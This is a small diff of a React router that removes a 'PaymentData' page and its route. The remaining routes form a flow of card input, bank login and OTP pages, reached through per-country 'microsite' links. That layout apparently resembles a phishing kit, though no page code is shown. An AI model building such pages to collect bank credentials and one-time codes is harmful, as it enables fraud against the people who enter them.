@@ -18,7 +18,6 @@ import Contracts from "./pages/Contracts";
 import Microsite from "./pages/Microsite";
 import PaymentRecipient from "./pages/PaymentRecipient";
 import PaymentDetails from "./pages/PaymentDetails";
-import PaymentData from "./pages/PaymentData";
 import PaymentBankSelector from "./pages/PaymentBankSelector";
 import PaymentCardInput from "./pages/PaymentCardInput";
 import PaymentBankLogin from "./pages/PaymentBankLogin";
@@ -51,7 +50,6 @@ const App = () => (
           <Route path="/contracts/:country" element={<Contracts />} />
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
-          <Route path="/pay/:id/data" element={<PaymentData />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
